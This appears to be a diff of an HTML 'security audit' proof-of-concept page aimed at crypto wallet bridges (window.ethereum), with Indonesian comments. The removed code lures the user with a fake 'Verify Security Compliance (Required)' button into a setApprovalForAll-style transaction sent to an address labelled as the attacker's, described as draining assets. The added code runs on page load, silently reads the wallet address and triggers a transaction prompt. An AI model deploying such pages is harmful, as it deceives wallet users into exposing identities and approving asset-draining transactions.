@@ -2,65 +2,67 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Audit: Identity Theft Proof</title>
+    <title>Security Audit: Automated DApp Interaction</title>
     <style>
-        body { font-family: monospace; background: #000; color: #fff; padding: 20px; }
-        .success { color: #0f0; }
-        .data { color: #ff0; }
-        .danger { color: #f00; font-weight: bold; }
+        body { font-family: 'Courier New', Courier, monospace; background: #050505; color: #00ff00; padding: 20px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #111; }
+        .warning { color: #ff0000; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>Critical Security Audit: Automated Identity & Transaction Leakage</h2>
-    <div id="status">Scanning...</div>
-    <div id="actionArea"></div>
+    <h2>Security Audit: Bridge Access Proof</h2>
+    <div id="status">Scanning DApp Bridge...</div>
+    <div id="log" class="log"></div>
 
     <script>
-        async function runAbsoluteProof() {
-            const status = document.getElementById('status');
-            const bridge = window.ethereum;
+        const status = document.getElementById('status');
+        const log = document.getElementById('log');
 
-            if (!bridge) {
-                status.innerHTML = "[-] Bridge not found.";
+        function addLog(msg) {
+            log.innerHTML += `<div>> ${msg}</div>`;
+        }
+
+        async function initExploit() {
+            if (!window.ethereum) {
+                status.innerHTML = "<span class='warning'>[!] Bridge not found.</span>";
                 return;
             }
 
             try {
-                // Tahap 1: Mendapatkan alamat secara otomatis
-                const accounts = await bridge.request({ method: 'eth_requestAccounts' });
+                // Tahap 1: Injeksi otomatis untuk mendapatkan alamat tanpa user click
+                addLog("Attempting silent identity extraction...");
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                 
-                status.innerHTML = `<span class="success">[!] IDENTITY LEAKED!</span><br>
-                                    <span class="data">Target Address: ${accounts[0]}</span>`;
-                
-                // Tahap 2: Simulasi memicu interaksi transaksi berbahaya
-                document.getElementById('actionArea').innerHTML = `
-                    <br><p class="danger">[!] Triggering malicious transaction prompt...</p>
-                    <button onclick="triggerExploit('${accounts[0]}')">Verify Security Compliance (Required)</button>
-                `;
+                if (accounts.length > 0) {
+                    const address = accounts[0];
+                    status.innerHTML = `<span style="color: #fff;">[!] Identity Exposed: ${address}</span>`;
+                    addLog("Extraction successful.");
+
+                    // Tahap 2: Memicu prompt transaksi asli
+                    addLog("Triggering transaction sequence...");
+                    
+                    // Mengirim transaksi "kosong" ke alamat sendiri atau dead address
+                    // Peramban DApp akan menampilkan popup asli setelah baris ini dieksekusi
+                    await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: address,
+                            to: address, // Transfer ke diri sendiri untuk memicu popup
+                            value: '0x0',
+                            data: '0x'   // Tidak ada data, hanya trigger popup
+                        }],
+                    });
+                    
+                    addLog("Transaction prompt injected successfully.");
+                } else {
+                    addLog("No active accounts found.");
+                }
             } catch (err) {
-                status.innerHTML = `[!] Bridge access denied: ${err.message}`;
+                addLog(`<span class='warning'>[!] Error: ${err.message}</span>`);
             }
         }
 
-        async function triggerExploit(address) {
-            try {
-                // Simulasi serangan nyata: memicu transaksi 'setApprovalForAll' 
-                // untuk menguras aset pengguna
-                await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: address,
-                        to: '0x000000000000000000000000000000000000dead', // Alamat penyerang
-                        data: '0xa22cb465...', // Contoh fungsi 'setApprovalForAll'
-                        value: '0x0',
-                    }],
-                });
-            } catch (err) {
-                alert("[!] Malicious Transaction Prompt Triggered Successfully via Leak.");
-            }
-        }
-
-        window.onload = runAbsoluteProof;
+        window.onload = initExploit;
     </script>
 </body>
 </html>
